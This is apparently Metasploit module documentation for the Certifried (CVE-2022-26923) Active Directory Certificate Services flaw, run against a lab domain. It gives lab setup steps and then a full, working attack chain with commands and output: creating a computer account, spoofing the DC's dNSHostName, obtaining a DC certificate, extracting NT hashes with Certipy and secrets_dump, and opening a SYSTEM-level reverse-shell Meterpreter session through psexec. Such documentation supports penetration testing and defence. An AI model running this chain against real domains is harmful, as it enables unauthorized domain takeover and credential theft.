## Vulnerable Application

This adds an auxiliary module that exploits a privilege escalation
vulnerability in Active Directory Certificate Services (ADCS) known as
Certifried (CVE-2022-26923) to generate a valid certificate impersonating the
Domain Controller computer account. This certificate can be used along with
[Certipy](https://github.com/ly4k/Certipy) or
[BloodyAD](https://github.com/CravateRouge/bloodyAD) to get a TGT and access
the DC as an Administrator.

The module will go through the following steps:
1. Create a computer account
1. Change the new computer's `dNSHostName` attribute to match that of the DC
1. Request a certificate for this computer account and store it in the loot
1. Delete the computer account (only possible if the user is an administrator)


### Installing ADCS on a DC

- Open the Server Manager
- Select Add roles and features
- Select "Active Directory Certificate Services" under the "Server Roles" section
- When prompted add all of the features and management tools
- On the AD CS "Role Services" tab, leave the default selection of only "Certificate Authority"
- Complete the installation and reboot the server
- Reopen the Server Manager
- Go to the AD CS tab and where it says "Configuration Required", hit "More" then "Configure Active Directory Certificate..."
- Select "Certificate Authority" in the Role Services tab
- Keep all of the default settings, noting the value of the "Common name for
  this CA" on the "CA Name" tab (this value corresponds to the CA datastore
  option)
- Accept the rest of the default settings and complete the configuration


## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `run rhosts=<remote host> SMBUser=<username> SMBPass=<user password> SMBDomain=<FQDN domain name> dc_name=<DC hostname> ca=<CA Name>`
1. Verify the module executes all the steps listed above
1. Verify the certificate is retrieved and stored in the loot


## Options

### DC_NAME

The name of the domain controller being targeted (must match RHOST)

### LDAP_PORT

The LDAP port. The default is 636 on an encrypted channel and 389 on a non-encrypted channel.

## Scenarios

### Windows Server 2019 Domain Controller with ADCS installed
```
msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > run verbose=true rhosts=10.0.0.24 SMBUser=test SMBPass=123456 SMBDomain=mylab.local dc_name='DC02' ca=mylab-DC02-CA
[*] Running module against 10.0.0.24

[*] 10.0.0.24:445 - Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...
[+] 10.0.0.24:445 - Successfully authenticated to LDAP (10.0.0.24:636)
[*] 10.0.0.24:445 - ms-DS-MachineAccountQuota = 10
[*] 10.0.0.24:445 - Connecting SMB with test.mylab.local:123456
[*] 10.0.0.24:445 - Connecting to Security Account Manager (SAM) Remote Protocol
[*] 10.0.0.24:445 - Binding to \samr...
[+] 10.0.0.24:445 - Bound to \samr
[+] 10.0.0.24:445 - Successfully created mylab.local\DESKTOP-0GUXZOAE$ with password jwei99cs1ZJipQcegi8n8TMbQIlsBVXg
[*] 10.0.0.24:445 - Disconnecting SMB
[+] 10.0.0.24:445 - Successfully authenticated to LDAP (10.0.0.24:636)
[*] 10.0.0.24:445 - Retrieved original DNSHostame dc02.mylab.local for DC02
[*] 10.0.0.24:445 - Attempting to set the DNS hostname for the computer DESKTOP-0GUXZOAE$ to the DNS hostname for the DC: DC02
[*] 10.0.0.24:445 - Retrieved original DNSHostame dc02.mylab.local for DESKTOP-0GUXZOAE$
[+] 10.0.0.24:445 - Successfully changed the DNS hostname
[*] 10.0.0.24:445 - Connecting SMB with DESKTOP-0GUXZOAE$.mylab.local:jwei99cs1ZJipQcegi8n8TMbQIlsBVXg
[*] 10.0.0.24:445 - Connecting to ICertPassage (ICPR) Remote Protocol
[*] 10.0.0.24:445 - Binding to \cert...
[+] 10.0.0.24:445 - Bound to \cert
[*] 10.0.0.24:445 - Requesting a certificate for user DESKTOP-0GUXZOAE$ - template: Machine
[+] 10.0.0.24:445 - The requested certificate was issued.
[*] 10.0.0.24:445 - Certificate stored at: /home/msfuser/.msf4/loot/20220927185732_default_unknown_windows.ad.cs_673960.pfx
[*] 10.0.0.24:445 - Disconnecting SMB
[*] 10.0.0.24:445 - Connecting SMB with test.mylab.local:123456
[*] 10.0.0.24:445 - Connecting to Security Account Manager (SAM) Remote Protocol
[*] 10.0.0.24:445 - Binding to \samr...
[+] 10.0.0.24:445 - Bound to \samr
[!] 10.0.0.24:445 - Unable to delete the computer account, this will have to be done manually with an Administrator account (Could not delete the computer DESKTOP-0GUXZOAE$: Error returned while deleting user in SAM server: (0xc0000022) STATUS_ACCESS_DENIED: {Access Denied} A process has requested access to an object but has not been granted those access rights.)
[*] 10.0.0.24:445 - Disconnecting SMB
[*] Auxiliary module execution completed
```

### Testing the Certificate

Certipy can be used to request a TGT using the certificate to authenticate. The
ticket will be stored in a `ccache` file and the DC NT hash will be displayed:
```
❯ PYTHONPATH=. python3 certipy/entry.py auth -pfx /home/msfuser/.msf4/loot/20220927185732_default_unknown_windows.ad.cs_673960.pfx -dc-ip 10.0.0.24
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: dc02$@mylab.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc02.ccache'
[*] Trying to retrieve NT hash for 'dc02$'
[*] Got hash for 'dc02$@mylab.local': aad3b435b51404eeaad3b435b51404ee:<redacted>
```

The NT hash can then be used with the `auxiliary/gather/windows_secrets_dump` module to dump the Administrator NT hash:
```
msf6 auxiliary(gather/windows_secrets_dump) > set ACTION DOMAIN
ACTION => DOMAIN
msf6 auxiliary(gather/windows_secrets_dump) > run verbose=true rhosts=10.0.0.24 SMBUser=DC02$ SMBPass=aad3b435b51404eeaad3b435b51404ee:<redacted> SMBDomain=mylab.local
[*] Running module against 10.0.0.24

[*] 10.0.0.24:445 - Opening Service Control Manager
[*] 10.0.0.24:445 - Binding to \svcctl...
[+] 10.0.0.24:445 - Bound to \svcctl
...
# NTLM hashes:
MYLAB\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
...
```

Finally, use this NT hash to get command execution with the `exploit/windows/smb/psexec` module:
```
msf6 exploit(windows/smb/psexec) > run verbose=true rhosts=10.0.0.24 SMBUser=Administrator SMBPass=aad3b435b51404eeaad3b435b51404ee:<redacted> SMBDomain=mylab.local

[*] Started reverse TCP handler on 10.0.0.1:4444
[*] 10.0.0.24:445 - Connecting to the server...
[*] 10.0.0.24:445 - Authenticating to 10.0.0.24:445|mylab.local as user 'Administrator'...
[*] 10.0.0.24:445 - Checking for System32\WindowsPowerShell\v1.0\powershell.exe
[*] 10.0.0.24:445 - PowerShell found
[*] 10.0.0.24:445 - Selecting PowerShell target
[*] 10.0.0.24:445 - Powershell command length: 4340
[*] 10.0.0.24:445 - Executing the payload...
[*] 10.0.0.24:445 - Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.0.0.24[\svcctl] ...
[*] 10.0.0.24:445 - Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.0.0.24[\svcctl] ...
[*] 10.0.0.24:445 - Obtaining a service manager handle...
[*] 10.0.0.24:445 - Creating the service...
[+] 10.0.0.24:445 - Successfully created the service
[*] 10.0.0.24:445 - Starting the service...
[+] 10.0.0.24:445 - Service start timed out, OK if running a command or non-service executable...
[*] 10.0.0.24:445 - Removing the service...
[+] 10.0.0.24:445 - Successfully removed the service
[*] 10.0.0.24:445 - Closing service handle...
[*] Sending stage (175686 bytes) to 10.0.0.1
[*] Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.0.1:58736) at 2022-09-27 21:26:10 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DC02
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MYLAB
Logged On Users : 7
Meterpreter     : x86/windows
```
